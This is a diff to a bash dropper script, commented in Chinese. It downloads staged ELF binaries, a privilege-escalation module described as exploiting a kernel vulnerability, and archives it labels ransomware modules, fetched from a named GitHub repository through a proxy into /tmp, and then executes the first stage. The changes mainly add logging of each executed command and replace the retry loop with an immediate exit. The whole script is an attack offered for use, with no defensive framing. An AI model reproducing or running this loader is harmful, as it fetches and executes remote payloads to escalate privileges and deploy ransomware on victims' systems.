@@ -67,14 +67,16 @@ TMPDIR="${TMPDIR_BASE}-${RAND_SUFFIX}"
 mkdir -p "$TMPDIR" || { log_error "[-] 创建临时目录失败: $TMPDIR"; exit 1; }
 cd "$TMPDIR" || { log_error "[-] 进入临时目录失败: $TMPDIR"; exit 1; }
 
-log_info "工作目录: $TMPDIR"
-log_info "Stage1: $STAGE1_URL"
-log_info "Stage2: $STAGE2_URL (主机: $HOST_NAME)"
+# log_info "工作目录: $TMPDIR"
+# log_info "Stage1: $STAGE1_URL"
+# log_info "Stage2: $STAGE2_URL (主机: $HOST_NAME)"
 
 # ==================== 下载函数 ====================
 download_file() {
     local url="$1" output="$2" desc="$3"
     log_info "[*] 正在下载 ${desc}... (${url})"
+    local cmd="wget -q --no-cache --tries=3 --timeout=15 \"$url\" -O \"$output\""
+    log_info "执行语句: $cmd"
     if ! wget -q --no-cache --tries=3 --timeout=15 "$url" -O "$output"; then
         log_error "[-] 下载 ${desc} 失败: ${url}"
         return 1
@@ -86,9 +88,9 @@ download_file() {
 
 # ==================== 主流程 ====================
 attempt=1
-log_info "================= 利用内核漏洞进行提权操作 ================="
 while [ $attempt -le $MAX_RETRIES ]; do
     log_info "====== 第 ${attempt}/${MAX_RETRIES} 次尝试 ======="
+    log_info "[Step 1] 远程连接"
 
     RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
     stage1_bin="s1_${RAND_SUFFIX}.elf"
@@ -107,7 +109,9 @@ while [ $attempt -le $MAX_RETRIES ]; do
     fi
 
     # ===================== 下载 escalation.sh 到 /tmp =====================
-    log_info "[*] 准备下载 escalation.sh 到固定位置: $ESCALATION_SH"
+    log_info "[*] 准备下载提权模块到固定位置: $ESCALATION_SH"
+    cmd="wget -q --no-cache --tries=3 --timeout=15 \"$ESCALATION_URL\" -O \"$ESCALATION_SH\""
+    log_info "执行语句: $cmd"
 
     if ! wget -q --no-cache --tries=3 --timeout=15 \
             "$ESCALATION_URL" -O "$ESCALATION_SH"; then
@@ -116,11 +120,13 @@ while [ $attempt -le $MAX_RETRIES ]; do
             # exit 1
     else
         chmod 755 "$ESCALATION_SH" 2>/dev/null || true
-        log_success "[+] escalation.sh 已成功下载到 $ESCALATION_SH"
+        log_success "[+] 提权模块已成功下载到 $ESCALATION_SH"
     fi
 
     # ===================== 下载 attack.tar.gz 到 /tmp =====================
     log_info "[*] 准备下载勒索模块 到 /tmp"
+    cmd="wget -q --no-cache --tries=3 --timeout=15 \"https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack.tar.gz\" -O \"/tmp/attack.tar.gz\""
+    log_info "执行语句: $cmd"
     if ! wget -q --no-cache --tries=3 --timeout=15 \
         "https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack.tar.gz" \
         -O "/tmp/attack.tar.gz"; then
@@ -130,12 +136,18 @@ while [ $attempt -le $MAX_RETRIES ]; do
         log_success "[+] 勒索模块已成功下载到 /tmp/attack.tar.gz"
         # 故意不加 chmod 755，因为压缩包不需要执行权限
     fi
+    cmd="wget -q --no-cache --tries=3 --timeout=15 \"https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack_ubuntu.tar.gz\" -O \"/tmp/attack_ubuntu.tar.gz\""
+    log_info "执行语句: $cmd"
     wget -q --no-cache --tries=3 --timeout=15 \
         "https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack_ubuntu.tar.gz" \
         -O "/tmp/attack_ubuntu.tar.gz"
 
-    log_info "[+] 下载阶段完成，继续后续操作..."
-    log_info "[*] 启动提权模块"
+    log_info "[+] 下载阶段完成，继续后续操作...\n"
+    log_info "[Step 2] 利用内核漏洞"
+    log_info "[*] 启动提权模块..."
+
+    cmd="STAGE2_URL=\"$STAGE2_URL\" STAGE2_FILENAME=\"$stage2_bin\" HOST_IDENTIFIER=\"$HOST_NAME\" chmod 777 \"./$stage1_bin\" \"./$stage2_bin\" && script -q -c \"./$stage1_bin\" /tmp/stage1.log"
+    log_info "执行语句: $cmd"
 
     if STAGE2_URL="$STAGE2_URL" \
        STAGE2_FILENAME="$stage2_bin" \
@@ -150,9 +162,10 @@ while [ $attempt -le $MAX_RETRIES ]; do
     else
         exit_code=$?
         log_error "[-] 提权执行失败，退出码: $exit_code"
-        log_warn "[*] 将在 ${RETRY_DELAY} 秒后重试... $((attempt + 1))/${MAX_RETRIES}"
-        attempt=$((attempt + 1))
-        sleep $RETRY_DELAY
+        exit 1
+        # log_warn "[*] 将在 ${RETRY_DELAY} 秒后重试... $((attempt + 1))/${MAX_RETRIES}"
+        # attempt=$((attempt + 1))
+        # sleep $RETRY_DELAY
     fi
 done
 exit 1
